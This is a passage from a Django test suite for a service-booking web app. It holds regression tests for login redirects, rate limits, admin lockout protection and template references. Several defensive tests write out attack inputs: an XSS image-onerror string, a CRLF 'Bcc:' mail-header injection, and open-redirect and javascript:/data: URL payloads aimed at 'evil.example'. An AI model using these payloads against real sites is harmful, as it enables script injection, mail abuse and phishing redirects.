    Django's default LOGIN_URL is '/accounts/login/', a path this project
    never defined, so every @login_required view redirected anonymous users to
    a 404 instead of the login form.
    """

    PROTECTED = [
        'my_bookings', 'notifications', 'user_dashboard', 'admin_dashboard',
        'worker_dashboard', 'worker_jobs', 'users_list', 'workers_list',
        'service_list', 'worker_earnings', 'worker_leave', 'edit_profile',
        'change_password', 'my_complaints', 'my_series', 'worker_profile',
        'worker_notifications', 'admin_booking_details',
        'admin_reviews_complaints', 'admin_contact_enquiries',
        'admin_notifications', 'service_requests', 'worker_manage_dashboard',
        'edit_worker_profile', 'service_create',
    ]

    def test_login_url_points_at_a_route_that_exists(self):
        self.assertEqual(settings.LOGIN_URL, 'login')
        self.assertEqual(reverse('login'), '/login/')

    def test_anonymous_is_sent_to_the_login_page_not_a_404(self):
        for name in self.PROTECTED:
            with self.subTest(view=name):
                response = self.client.get(reverse(name))
                self.assertEqual(response.status_code, 302)
                self.assertIn(reverse('login'), response['Location'])


class BookServiceWithoutServiceTest(TestCase):
    """A bare /book-service/ GET used to raise NoReverseMatch -> HTTP 500."""

    def setUp(self):
        self.customer = _make_user('bs_customer')
        self.client.login(username=self.customer.username, password='Password123!')

    def test_bare_get_redirects_to_the_catalogue(self):
        response = self.client.get(reverse('book_service'))
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse('service_page'), response['Location'])

    def test_bare_get_never_500s(self):
        response = self.client.get(reverse('book_service'), follow=True)
        self.assertEqual(response.status_code, 200)

    def test_worker_only_get_still_renders_the_booking_page(self):
        service = Service.objects.create(
            name='BookSvcPlumb', description='d', price=Decimal('100.00'), is_active=True
        )
        worker = _make_worker('bs_worker', service)
        response = self.client.get(
            reverse('book_service'), {'service': service.id, 'worker': worker.id}
        )
        self.assertEqual(response.status_code, 200)


class WorkerDistanceImportTest(SimpleTestCase):
    """P1-A: views.py referenced geocode_place/haversine_km without importing them.

    The NameError was swallowed by the broad `except Exception` in the AI
    endpoint, so a worker with an address but no coordinates silently broke the
    whole service-match reply.
    """

    def test_views_module_exposes_both_helpers(self):
        from lamoapp import views

        self.assertTrue(hasattr(views, 'geocode_place'))
        self.assertTrue(hasattr(views, 'haversine_km'))

    def test_distance_is_computed_for_a_worker_with_only_an_address(self):
        from lamoapp import views

        class _Worker:
            latitude = None
            longitude = None
            address = 'Marine Drive, Ernakulam'
            district = 'Ernakulam'
            user = None

        with patch('lamoapp.views.geocode_place', return_value=(9.93, 76.26)) as geo, \
             patch('lamoapp.views.haversine_km', return_value=3.4) as hav:
            distance, label = views._compute_worker_distance(9.95, 76.28, _Worker())

        self.assertTrue(geo.called, 'the address was never geocoded')
        self.assertTrue(hav.called, 'haversine was never called')
        self.assertAlmostEqual(distance, 3.4)
        self.assertEqual(label, 'Within 5 km')

    def test_distance_uses_explicit_coordinates_without_geocoding(self):
        from lamoapp import views

        class _Worker:
            latitude = 9.93
            longitude = 76.26
            address = ''
            district = 'Ernakulam'
            user = None

        distance, label = views._compute_worker_distance(9.95, 76.28, _Worker())
        self.assertIsNotNone(distance)
        self.assertTrue(label)

class WorkerEmergencyUiTest(TestCase):
    """Workers must actually SEE and be able to accept emergency requests.

    The view has always supplied `emergency_bookings`, but no template rendered
    it, so the whole emergency workflow was unreachable from the UI.
    """

    def setUp(self):
        self.service = Service.objects.create(
            name='EmergPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.customer = _make_user('emerg_ui_customer')
        self.worker = _make_worker('emerg_ui_worker', self.service)
        self.booking = Booking.objects.create(
            customer=self.customer, worker=None, service=self.service,
            booking_type='Emergency', date=None, time='ASAP',
            location='Kochi', phone='9876543210',
            district='Ernakulam', status='EMERGENCY_PENDING',
        )
        self.client.login(username=self.worker.user.username, password='Password123!')

    def test_dashboard_renders_an_accept_form_for_the_emergency(self):
        response = self.client.get(reverse('worker_dashboard'))
        self.assertEqual(response.status_code, 200)
        html = response.content.decode()
        self.assertIn(reverse('worker_accept_emergency', args=[self.booking.id]), html)
        self.assertIn('Emergency Requests', html)

    def test_accept_form_carries_a_csrf_token(self):
        html = self.client.get(reverse('worker_dashboard')).content.decode()
        idx = html.find(reverse('worker_accept_emergency', args=[self.booking.id]))
        self.assertGreater(idx, -1)
        window = html[max(0, idx - 400):idx + 400]
        self.assertIn('csrfmiddlewaretoken', window)

    def test_other_trades_emergency_is_not_offered(self):
        other = Service.objects.create(
            name='EmergElec', description='d', price=Decimal('600.00'), is_active=True
        )
        other_job = Booking.objects.create(
            customer=self.customer, worker=None, service=other,
            booking_type='Emergency', date=None, time='ASAP',
            location='Kochi', phone='9876543210', status='EMERGENCY_PENDING',
        )
        html = self.client.get(reverse('worker_dashboard')).content.decode()
        self.assertIn(reverse('worker_accept_emergency', args=[self.booking.id]), html)
        self.assertNotIn(
            reverse('worker_accept_emergency', args=[other_job.id]), html
        )

    def test_management_dashboard_also_offers_the_emergency(self):
        html = self.client.get(reverse('worker_manage_dashboard')).content.decode()
        self.assertIn(reverse('worker_accept_emergency', args=[self.booking.id]), html)

    def test_no_emergency_block_when_there_is_nothing_to_accept(self):
        Booking.objects.all().delete()
        response = self.client.get(reverse('worker_dashboard'))
        self.assertEqual(response.status_code, 200)
        html = response.content.decode()
        # An empty state is expected - but it must NOT offer an accept form.
        self.assertNotIn(
            reverse('worker_accept_emergency', args=[self.booking.id]), html
        )
        self.assertIn('No emergency requests', html)


class BookingErrorXssRegressionTest(SimpleTestCase):
    """P1-B: the booking modal must not write server text into innerHTML."""

    TEMPLATE = (
        Path(__file__).resolve().parent.parent
        / 'templates' / 'lamo_service' / 'service_workers.html'
    )

    def _source(self):
        return self.TEMPLATE.read_text(encoding='utf-8')

    def test_error_is_rendered_with_safe_dom_calls(self):
        source = (
            self.TEMPLATE.parent / 'includes' / 'booking_modal.html'
        ).read_text(encoding='utf-8')
        self.assertIn('function showBookingError(', source)
        self.assertIn('document.createElement', source)
        self.assertIn('document.createTextNode', source)

    def test_server_message_is_never_interpolated_into_innerhtml(self):
        source = self._source()
        self.assertNotIn('${errMsg}', source)

    def test_modal_error_box_is_cleared_with_textcontent(self):
        modal = self.TEMPLATE.parent / 'includes' / 'booking_modal.html'
        self.assertIn(
            'modalErrorBox.textContent = "";',
            modal.read_text(encoding='utf-8'),
        )


class RegisterJsInlineHandlerTest(SimpleTestCase):
    """register.html wires inline onclick handlers to functions in this JS.

    The whole file lives inside a DOMContentLoaded callback, so those functions
    were not on window and the browser raised "not defined" - the password
    show/hide and "Other service" toggles were dead.
    """

    JS = Path(__file__).resolve().parent / 'static' / 'js' / 'accounts-register.js'

    def test_inline_handler_functions_are_exported_to_window(self):
        source = self.JS.read_text(encoding='utf-8')
        self.assertIn('window.togglePassword = togglePassword;', source)
        self.assertIn('window.toggleOtherService = toggleOtherService;', source)

    def test_template_actually_uses_those_handlers(self):
        template = (
            Path(__file__).resolve().parent.parent
            / 'templates' / 'accounts' / 'register.html'
        ).read_text(encoding='utf-8')
        self.assertIn('togglePassword(', template)
        self.assertIn('toggleOtherService(', template)


class RegisterLiveValidationTest(SimpleTestCase):
    """register.html shows validation messages while the user types.

    The checks live in ``accounts-register.js`` (``liveValidationMessage``)
    and render into the ``<small class="field-error" id="<field>Error">``
    slots register.html places inside each field's *existing* wrapper -
    inside it, never beside it, because the step entrance animation
    staggers ``.input-group:nth-child(...)`` and a new sibling would
    silently change those delays.
    """

    ROOT = Path(__file__).resolve().parent
    JS = ROOT / 'static' / 'js' / 'accounts-register.js'
    CSS = ROOT / 'static' / 'css' / 'accounts-register.css'
    TEMPLATE = ROOT.parent / 'templates' / 'accounts' / 'register.html'

    LIVE_FIELDS = (
        'username', 'email', 'password', 'confirm_password', 'phone',
        'service', 'custom_service', 'district', 'address',
        'experience_years', 'availability', 'pricing_amount',
        'proof_type', 'proof_document',
    )

    MESSAGES = (
        # Required fields
        'Username is required.',
        'Email is required.',
        'Password is required.',
        # Password rules
        'Password must contain at least 8 characters.',
        'This password is entirely numeric.',
        'Passwords do not match.',
        # Email / phone format
        'Please enter a valid email address.',
        'Please enter a valid 10-digit Indian mobile number.',
    )

    def test_template_has_an_error_slot_for_every_live_field(self):
        template = self.TEMPLATE.read_text(encoding='utf-8')
        for field in self.LIVE_FIELDS:
            with self.subTest(field=field):
                self.assertIn('id="{}Error"'.format(field), template)
        # One slot per field - no duplicates.
        self.assertEqual(
            template.count('class="field-error"'),
            len(self.LIVE_FIELDS),
        )

    def test_error_slots_sit_inside_the_fields_wrapper(self):
        template = self.TEMPLATE.read_text(encoding='utf-8')
        for field in ('username', 'email', 'password', 'phone', 'address'):
            with self.subTest(field=field):
                start = template.index('id="{}"'.format(field))
                end = template.index('id="{}Error"'.format(field))
                self.assertNotIn('</div>', template[start:end])

    def test_js_validates_while_typing_not_only_on_submit(self):
        source = self.JS.read_text(encoding='utf-8')
        self.assertIn("addEventListener('input'", source)
        self.assertIn("addEventListener('change'", source)
        self.assertIn("addEventListener('blur'", source)
        self.assertIn('liveValidationMessage', source)

    def test_live_messages_match_the_existing_wording(self):
        source = self.JS.read_text(encoding='utf-8')
        for message in self.MESSAGES:
            with self.subTest(message=message):
                self.assertIn(message, source)

    def test_css_styles_the_inline_error_state(self):
        css = self.CSS.read_text(encoding='utf-8')
        self.assertIn('.field-error {', css)
        self.assertIn('.field-error.show', css)
        self.assertIn('.input-group.has-error', css)
        self.assertIn('.lamo-input.invalid', css)


class RegisterLiveValidationRenderTest(TestCase):
    """Editing the template must not break the registration page itself."""

    def test_register_page_renders_with_every_live_error_slot(self):
        response = self.client.get(reverse('register'))
        self.assertEqual(response.status_code, 200)
        for field in RegisterLiveValidationTest.LIVE_FIELDS:
            with self.subTest(field=field):
                self.assertContains(response, 'id="{}Error"'.format(field))


class _RateLimitIsolationMixin:
    """Rate-limit counters live in the (process-wide) cache, not the database.

    Django rolls back the test database between tests, which resets auto-
    increment ids, so two tests can end up with the *same* user pk and
    therefore the *same* cache key. Clearing the counters in setUp keeps each
    test independent; it does not change what the production code does.
    """

    def _reset_rate_limits(self, *keys):
        cache.clear()

    def setUp(self):
        self._reset_rate_limits()
        super().setUp()


class EmergencyRateLimitTest(_RateLimitIsolationMixin, TestCase):
    """P1-C: an emergency broadcast must not be spammable."""

    MAX = 5

    def setUp(self):
        super().setUp()
        self.service = Service.objects.create(
            name='RLPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.customer = _make_user('rl_customer')
        self.client.login(username=self.customer.username, password='Password123!')

    def _post(self):
        return self.client.post(
            reverse('book_service'),
            {
                'service': self.service.id,
                'district': 'Ernakulam',
                'problem': 'Burst pipe, water everywhere',
                'location': 'Kochi',
                'phone': '9876543210',
                'time': 'ASAP',
            },
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )

    def test_legitimate_first_request_still_works(self):
        response = self._post()
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json()['success'])
        self.assertEqual(Booking.objects.filter(customer=self.customer).count(), 1)

    def test_repeated_requests_are_throttled(self):
        for _ in range(self.MAX):
            self._post()
        response = self._post()
        self.assertEqual(response.status_code, 429)
        self.assertFalse(response.json()['success'])

    def test_throttle_creates_no_further_bookings(self):
        for _ in range(self.MAX):
            self._post()
        before = Booking.objects.filter(customer=self.customer).count()
        self._post()
        after = Booking.objects.filter(customer=self.customer).count()
        self.assertEqual(before, after, 'a throttled request still created a booking')


class EmergencyStaleBroadcastTest(_RateLimitIsolationMixin, TestCase):
    """P1-C: unclaimed broadcasts must not accumulate forever."""

    def setUp(self):
        super().setUp()
        self.service = Service.objects.create(
            name='StalePlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.customer = _make_user('stale_customer')
        self.client.login(username=self.customer.username, password='Password123!')

    def test_old_unclaimed_emergency_is_cancelled_by_the_next_one(self):
        stale = Booking.objects.create(
            customer=self.customer, worker=None, service=self.service,
            booking_type='Emergency', date=None, time='ASAP', location='Kochi',
            phone='9876543210', status='EMERGENCY_PENDING',
        )
        Booking.objects.filter(id=stale.id).update(
            created_at=timezone.now() - timedelta(days=3)
        )

        self.client.post(
            reverse('book_service'),
            {
                'service': self.service.id, 'district': 'Ernakulam',
                'problem': 'Help', 'location': 'Kochi',
                'phone': '9876543210', 'time': 'ASAP',
            },
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )

        stale.refresh_from_db()
        self.assertEqual(stale.status, 'CANCELLED')


class EmergencyInputValidationTest(_RateLimitIsolationMixin, TestCase):
    """P1-B: district must be validated and exceptions must not leak."""

    def setUp(self):
        super().setUp()
        self.service = Service.objects.create(
            name='ValPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.customer = _make_user('val_customer')
        self.client.login(username=self.customer.username, password='Password123!')

    def _post(self, district):
        return self.client.post(
            reverse('book_service'),
            {
                'service': self.service.id, 'district': district,
                'problem': 'Help', 'location': 'Kochi',
                'phone': '9876543210', 'time': 'ASAP',
            },
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )

    def test_valid_district_is_accepted(self):
        self.assertEqual(self._post('Ernakulam').status_code, 200)

    def test_injected_district_is_rejected(self):
        payload = '<img src=x onerror=alert(1)>'
        response = self._post(payload)
        self.assertEqual(response.status_code, 400)
        self.assertNotIn(payload, response.json()['error_message'])

    def test_invalid_district_is_never_persisted(self):
        self._post('NOT-A-DISTRICT')
        self.assertFalse(Booking.objects.filter(customer=self.customer).exists())

    def test_save_failure_does_not_return_the_exception_text(self):
        with patch(
            'lamoapp.views.Booking.objects.create',
            side_effect=ValueError('no such column: secret_table_name'),
        ):
            response = self._post('Ernakulam')
        body = response.content.decode()
        self.assertNotIn('secret_table_name', body)
        self.assertNotIn('Traceback', body)

class ContactFormAbuseTest(_RateLimitIsolationMixin, TestCase):
    """P1-D: the public contact form must not be a mail-bombing primitive."""

    MAX = 5

    def setUp(self):
        super().setUp()

    def _post(self, email='visitor@example.com', subject='Hello'):
        return self.client.post(
            reverse('contact'),
            {
                'name': 'Visitor', 'email': email,
                'subject': subject, 'message': 'I need help.',
            },
        )

    def test_first_submission_still_works(self):
        response = self._post()
        self.assertEqual(response.status_code, 200)
        self.assertEqual(ContactEnquiry.objects.count(), 1)

    def test_repeated_submissions_are_throttled(self):
        for _ in range(self.MAX):
            self._post()
        self._post()
        self.assertEqual(ContactEnquiry.objects.count(), self.MAX)

    def test_crlf_in_subject_is_stripped(self):
        self._post(subject='Hi\r\nBcc: victim@example.com')
        enquiry = ContactEnquiry.objects.first()
        self.assertNotIn('\r', enquiry.subject)
        self.assertNotIn('\n', enquiry.subject)

    def test_header_sanitizer_helper(self):
        from lamoapp.views import _sanitize_mail_header

        self.assertEqual(_sanitize_mail_header('a\r\nBcc: x@y.com'), 'a Bcc: x@y.com')
        self.assertEqual(_sanitize_mail_header('plain'), 'plain')
        self.assertEqual(_sanitize_mail_header(None), '')
        self.assertEqual(len(_sanitize_mail_header('x' * 500)), 200)


class AdminSelfProtectionTest(TestCase):
    """Admins must not lock themselves out or delete the final active admin."""

    def setUp(self):
        self.admin = _make_user('self_protect_admin', role='ADMIN')
        self.admin.is_staff = True
        self.admin.is_superuser = True
        self.admin.save(update_fields=['is_staff', 'is_superuser'])

        self.other_admin = _make_user('other_admin', role='ADMIN')
        self.other_admin.is_staff = True
        self.other_admin.is_superuser = True
        self.other_admin.save(update_fields=['is_staff', 'is_superuser'])

        self.regular_user = _make_user('regular_user', role='USER')
        self.client.force_login(self.admin)

    def _admin_change_url(self, user):
        return reverse('admin:lamoapp_customuser_change', args=[user.pk])

    def _admin_delete_url(self, user):
        return reverse('admin:lamoapp_customuser_delete', args=[user.pk])

    def test_admin_cannot_delete_self_via_admin_delete_page(self):
        response = self.client.post(
            self._admin_delete_url(self.admin),
            {'post': 'yes'},
        )

        self.assertIn(response.status_code, (302, 403))
        self.assertTrue(CustomUser.objects.filter(pk=self.admin.pk).exists())

    def test_admin_cannot_deactivate_self_via_admin_change_form(self):
        response = self.client.post(
            self._admin_change_url(self.admin),
            {
                'username': self.admin.username,
                'email': self.admin.email,
                'password': 'Password123!',
                'date_joined_0': self.admin.date_joined.strftime('%Y-%m-%d'),
                'date_joined_1': self.admin.date_joined.strftime('%H:%M:%S'),
                'otp_failed_attempts': self.admin.otp_failed_attempts,
                'role': 'ADMIN',
                'is_active': 'False',
                'is_staff': '1',
                'is_email_verified': '1',
                '_save': 'Save',
            },
        )

        self.admin.refresh_from_db()
        self.assertIn(response.status_code, (302, 403))
        self.assertTrue(self.admin.is_active)

    def test_admin_cannot_demote_self_via_admin_change_form(self):
        response = self.client.post(
            self._admin_change_url(self.admin),
            {
                'username': self.admin.username,
                'email': self.admin.email,
                'password': 'Password123!',
                'date_joined_0': self.admin.date_joined.strftime('%Y-%m-%d'),
                'date_joined_1': self.admin.date_joined.strftime('%H:%M:%S'),
                'otp_failed_attempts': self.admin.otp_failed_attempts,
                'role': 'USER',
                'is_active': 'True',
                'is_staff': '1',
                'is_email_verified': '1',
                '_save': 'Save',
            },
        )

        self.admin.refresh_from_db()
        self.assertEqual(response.status_code, 403)
        self.assertEqual(self.admin.role, 'ADMIN')

    def test_last_active_admin_cannot_be_deactivated(self):
        self.other_admin.is_active = False
        self.other_admin.is_staff = False
        self.other_admin.save(update_fields=['is_active', 'is_staff'])

        response = self.client.post(
            self._admin_change_url(self.admin),
            {
                'username': self.admin.username,
                'email': self.admin.email,
                'password': 'Password123!',
                'date_joined_0': self.admin.date_joined.strftime('%Y-%m-%d'),
                'date_joined_1': self.admin.date_joined.strftime('%H:%M:%S'),
                'otp_failed_attempts': self.admin.otp_failed_attempts,
                'role': 'ADMIN',
                'is_active': 'False',
                'is_staff': '1',
                'is_email_verified': '1',
                '_save': 'Save',
            },
        )

        self.admin.refresh_from_db()
        self.assertIn(response.status_code, (302, 403))
        self.assertTrue(self.admin.is_active)

    def test_last_active_admin_cannot_be_demoted(self):
        self.other_admin.is_active = False
        self.other_admin.is_staff = False
        self.other_admin.save(update_fields=['is_active', 'is_staff'])

        response = self.client.post(
            self._admin_change_url(self.admin),
            {
                'username': self.admin.username,
                'email': self.admin.email,
                'password': 'Password123!',
                'date_joined_0': self.admin.date_joined.strftime('%Y-%m-%d'),
                'date_joined_1': self.admin.date_joined.strftime('%H:%M:%S'),
                'otp_failed_attempts': self.admin.otp_failed_attempts,
                'role': 'USER',
                'is_active': 'True',
                'is_staff': '1',
                'is_email_verified': '1',
                '_save': 'Save',
            },
        )

        self.admin.refresh_from_db()
        self.assertEqual(response.status_code, 403)
        self.assertEqual(self.admin.role, 'ADMIN')

    def test_admin_can_manage_another_user_and_admin(self):
        other_user = _make_user('other_regular_user', role='USER')
        response = self.client.post(
            self._admin_change_url(other_user),
            {
                'username': other_user.username,
                'email': other_user.email,
                'password': 'Password123!',
                'date_joined_0': other_user.date_joined.strftime('%Y-%m-%d'),
                'date_joined_1': other_user.date_joined.strftime('%H:%M:%S'),
                'otp_failed_attempts': other_user.otp_failed_attempts,
                'role': 'USER',
                'is_active': 'False',
                'is_staff': '0',
                'is_email_verified': '1',
                '_save': 'Save',
            },
        )
        other_user.refresh_from_db()
        self.assertEqual(response.status_code, 302)
        self.assertFalse(other_user.is_active)

        response = self.client.post(
            self._admin_change_url(self.other_admin),
            {
                'username': self.other_admin.username,
                'email': self.other_admin.email,
                'password': 'Password123!',
                'date_joined_0': self.other_admin.date_joined.strftime('%Y-%m-%d'),
                'date_joined_1': self.other_admin.date_joined.strftime('%H:%M:%S'),
                'otp_failed_attempts': self.other_admin.otp_failed_attempts,
                'role': 'ADMIN',
                'is_active': 'True',
                'is_staff': '1',
                'is_email_verified': '1',
                '_save': 'Save',
            },
        )
        self.other_admin.refresh_from_db()
        self.assertEqual(response.status_code, 302)
        self.assertTrue(self.other_admin.is_active)

    def test_unauthorized_user_cannot_manage_admin_accounts(self):
        self.client.logout()
        self.client.force_login(self.regular_user)

        response = self.client.post(
            self._admin_delete_url(self.other_admin),
            {'post': 'yes'},
        )
        self.assertIn(response.status_code, (302, 403))
        self.assertTrue(CustomUser.objects.filter(pk=self.other_admin.pk).exists())


class TemplateIntegrityTest(SimpleTestCase):
    """Every {% url %}, {% include %} and {% extends %} must resolve."""

    TEMPLATE_ROOT = Path(__file__).resolve().parent.parent / 'templates'

    def _all_templates(self):
        return sorted(self.TEMPLATE_ROOT.rglob('*.html'))

    # URL names that legitimately require an argument, e.g.
    # {% url 'admin_export_csv' 'bookings' %}. These are checked with a
    # matching placeholder below instead of being reverse()'d bare.
    URL_TAKES_ARG = {
        'admin_export_csv': 'bookings',
        'service_detail': '1',
        'service_workers': '1',
        'service_update': '1',
        'service_delete': '1',
        'admin_booking_view': '1',
        'admin_enquiry_detail': '1',
        'service_request_approve': '1',
        'service_request_publish': '1',
        'booking_invoice': '1',
        'booking_messages': '1',
        'cancel_booking': '1',
        'confirm_payment': '1',
        'admin_confirm_payment': '1',
        'confirm_completion': '1',
        'raise_complaint': '1',
        'submit_review': '1',
        'submit_feedback': '1',
        'worker_accept_booking': '1',
        'worker_reject_booking': '1',
        'worker_accept_emergency': '1',
        'worker_start_job': '1',
        'worker_request_completion': '1',
        'worker_leave_delete': '1',
        'series_toggle_active': '1',
        'series_cancel': '1',
        'admin_delete_user': '1',
        'admin_delete_worker': '1',
        'admin_suspend_worker': '1',
        'worker_verify': '1',
        'worker_proof_document': '1',
        'ai_recommend_workers': '1',
        'mark_notification_read': '1',
        'update_complaint_status': '1',
        'reset_password': 'sometoken',
    }

    def test_every_template_reference_resolves(self):
        broken = []
        for path in self._all_templates():
            source = path.read_text(encoding='utf-8', errors='replace')
            for name in re.findall(r"{%\s*url\s+'([^']+)'", source):
                args = [self.URL_TAKES_ARG[name]] if name in self.URL_TAKES_ARG else []
                try:
                    reverse(name, args=args)
                except Exception:
                    broken.append('%s -> url %s' % (path.name, name))
            for ref in re.findall(r"{%\s*include\s+['\"]([^'\"]+)", source):
                if not (self.TEMPLATE_ROOT / ref).exists():
                    broken.append('%s -> include %s' % (path.name, ref))
            for ref in re.findall(r"{%\s*extends\s+['\"]([^'\"]+)", source):
                if not (self.TEMPLATE_ROOT / ref).exists():
                    broken.append('%s -> extends %s' % (path.name, ref))
        self.assertEqual(broken, [], 'unresolvable template references')

    def test_no_template_references_a_deleted_page(self):
        # accounts/reset_password.html was removed; nothing may still extend it.
        for path in self._all_templates():
            source = path.read_text(encoding='utf-8', errors='replace')
            self.assertNotIn('accounts/reset_password.html', source, path.name)


class PostOnlyEndpointsTest(TestCase):
    """State-changing endpoints must not act on GET."""

    def setUp(self):
        self.service = Service.objects.create(
            name='PoPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.customer = _make_user('po_customer')
        self.worker = _make_worker('po_worker', self.service)
        self.booking = Booking.objects.create(
            customer=self.customer, worker=self.worker, service=self.service,
            date=date_type.today() + timedelta(days=2), time='10:00 AM',
            location='Kochi', phone='9876543210', status='PENDING',
        )

    def test_cancel_requires_post(self):
        self.client.login(username=self.customer.username, password='Password123!')
        self.client.get(reverse('cancel_booking', args=[self.booking.id]))
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'PENDING')

    def test_worker_verify_requires_post(self):
        admin = _make_user('po_admin', role='ADMIN')
        self.worker.is_verified = False
        self.worker.save()
        self.client.login(username=admin.username, password='Password123!')
        self.client.get(reverse('worker_verify', args=[self.worker.id]))
        self.worker.refresh_from_db()
        self.assertFalse(self.worker.is_verified)

    def test_mark_notification_read_requires_post(self):
        from lamoapp.models import Notification

        note = Notification.objects.create(
            recipient=self.customer, notification_type='SYSTEM', message='hi'
        )
        self.client.login(username=self.customer.username, password='Password123!')
        self.client.get(reverse('mark_notification_read', args=[note.id]))
        note.refresh_from_db()
        self.assertFalse(note.is_read)

# ============================================================
# UI/UX FUNCTIONALITY BATCH - REGRESSION TESTS
# ============================================================
# One class per feature implemented in this batch. Each locks down
# the behaviour that was previously missing or broken.


class RegistrationNextFlowTest(TestCase):
    """?next= is produced by home.html / service_page.html and must survive
    register -> OTP -> login, without ever becoming an open redirect."""

    def setUp(self):
        self.service = Service.objects.create(
            name='NextFlowPlumb', description='d', price=Decimal('500.00'), is_active=True
        )

    def _register(self, client, username, next_value=None, with_next_field=True):
        data = {
            'username': username, 'email': '%s@t.com' % username,
            'password': 'Password123!', 'confirm_password': 'Password123!',
            'role': 'USER',
        }
        if next_value is not None and with_next_field:
            data['next'] = next_value
        return client.post(reverse('register'), data)

    def _verify_and_login(self, client, username):
        otp = CustomUser.objects.get(username=username).email_verification_otp
        client.post(reverse('verify_otp'), {'action': 'verify', 'otp': otp})
        return client.post(
            reverse('login'), {'username': username, 'password': 'Password123!'}
        )

    def test_safe_next_survives_registration_and_otp(self):
        target = reverse('service_detail', args=[self.service.id])
        client = Client()
        client.get(reverse('register') + '?next=' + target)
        self.assertEqual(client.session.get('registration_next'), target)
        self._register(client, 'nextok', next_value=target)
        response = self._verify_and_login(client, 'nextok')
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response['Location'], target)

    def test_next_set_on_get_is_kept_when_post_omits_it(self):
        target = reverse('service_detail', args=[self.service.id])
        client = Client()
        client.get(reverse('register') + '?next=' + target)
        self._register(client, 'nextget', next_value=None, with_next_field=False)
        response = self._verify_and_login(client, 'nextget')
        self.assertEqual(response['Location'], target)

    def test_unsafe_next_is_never_stored_or_used(self):
        payloads = [
            'https://evil.example/steal',
            '//evil.example',
            '/\\evil.example',
            'http://localhost.evil.example/',
            'javascript:alert(1)',
        ]
        for index, payload in enumerate(payloads):
            with self.subTest(payload=payload):
                client = Client()
                client.get(reverse('register') + '?next=' + payload)
                self.assertIsNone(
                    client.session.get('registration_next'),
                    'unsafe next was stored: %r' % payload,
                )
                username = 'unsafe%d' % index
                self._register(client, username, next_value=payload)
                response = self._verify_and_login(client, username)
                # Falls back to the normal role destination for a USER.
                self.assertEqual(response['Location'], reverse('home'))

    def test_next_is_single_use(self):
        target = reverse('my_bookings')
        client = Client()
        client.get(reverse('register') + '?next=' + target)
        self._register(client, 'nextonce', next_value=target)

        # Verify the email first - login bounces unverified users to the OTP page.
        otp = CustomUser.objects.get(username='nextonce').email_verification_otp
        client.post(reverse('verify_otp'), {'action': 'verify', 'otp': otp})

        # First sign-in consumes the stored target.
        first = client.post(
            reverse('login'), {'username': 'nextonce', 'password': 'Password123!'}
        )
        self.assertEqual(first['Location'], target)
        self.assertIsNone(client.session.get('registration_next'))

        # A later sign-in must NOT be redirected to the stale target.
        client.logout()
        second = client.post(
            reverse('login'), {'username': 'nextonce', 'password': 'Password123!'}
        )
        self.assertNotEqual(second['Location'], target)

    def test_no_next_behaves_exactly_as_before(self):
        client = Client()
        client.get(reverse('register'))
        self._register(client, 'nonext')
        response = self._verify_and_login(client, 'nonext')
        self.assertEqual(response['Location'], reverse('home'))

    def test_helper_rejects_non_local_paths(self):
        from lamoapp.views import _safe_internal_path

        request = self.client.get(reverse('home')).wsgi_request
        self.assertEqual(_safe_internal_path(request, None, '/fallback'), '/fallback')
        self.assertEqual(_safe_internal_path(request, '', '/fallback'), '/fallback')
        self.assertEqual(_safe_internal_path(request, '/ok/', '/x'), '/ok/')
        for bad in ('https://evil.example/', '//evil.example', '/\\x', '/a\nb'):
            self.assertEqual(
                _safe_internal_path(request, bad, '/fallback'), '/fallback', bad
            )


class RegistrationNextTargetMatrixTest(TestCase):
    """Step 1 of the hardening pass: an explicit accept/reject matrix for the
    exact ``?next=`` values named in the audit, run through the real
    register -> OTP -> login journey.

    Every case drives the *whole* flow with a fresh ``Client`` so nothing
    leaks between scenarios.
    """

    # (label, ?next= query, expect the stored/used target?)
    SAFE_TARGETS = [
        ('service_detail', '/services/5/'),
        ('dashboard', '/dashboard/'),
        ('worker_dashboard', '/worker-dashboard/'),
        ('my_bookings', '/my-bookings/'),
        ('service_page', '/service_page/'),
    ]

    UNSAFE_TARGETS = [
        'https://evil.example/',
        'https://evil.example/steal?a=b',
        '//evil.example/',
        '//evil.example/steal',
        '/\\evil.example',
        'http://localhost.evil.example/',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '  //evil.example/  ',
    ]

    def _full_flow(self, next_value, username):
        """register -> OTP -> login, returning the stored value and Location."""
        client = Client()
        query = '' if next_value is None else '?next=' + next_value
        client.get(reverse('register') + query)
        stored = client.session.get('registration_next')

        client.post(
            reverse('register'),
            {
                'username': username,
                'email': '%s@t.com' % username,
                'password': 'Password123!',
                'confirm_password': 'Password123!',
                'role': 'USER',
            },
        )
        otp = CustomUser.objects.get(username=username).email_verification_otp
        client.post(reverse('verify_otp'), {'action': 'verify', 'otp': otp})
        response = client.post(
            reverse('login'), {'username': username, 'password': 'Password123!'}
        )
        return stored, response['Location']

    def test_safe_internal_targets_are_preserved_end_to_end(self):
        for index, (label, target) in enumerate(self.SAFE_TARGETS):
            with self.subTest(target=label):
                stored, location = self._full_flow(target, 'safe%d' % index)
                self.assertEqual(stored, target, 'not stored for %s' % label)
                self.assertEqual(location, target, 'not honoured for %s' % label)

    def test_unsafe_targets_fall_back_and_are_never_honoured(self):
        for index, payload in enumerate(self.UNSAFE_TARGETS):
            with self.subTest(payload=payload):
                stored, location = self._full_flow(payload, 'unsafe%d' % index)
                self.assertIsNone(stored, 'unsafe next stored: %r' % payload)
                # USER default destination.
                self.assertEqual(location, reverse('home'), payload)
                self.assertNotIn('evil', location.lower(), payload)

    def test_missing_and_empty_next_use_the_default(self):
        for index, payload in enumerate((None, '', '   ')):
            with self.subTest(payload=payload):
                stored, location = self._full_flow(payload, 'missing%d' % index)
                self.assertIsNone(stored)
                self.assertEqual(location, reverse('home'))

    def test_unresolvable_internal_path_is_still_honoured(self):
        # An internal path that does not resolve must be *preserved* (it is a
        # safe local target); it is the target view's job to 404. This asserts
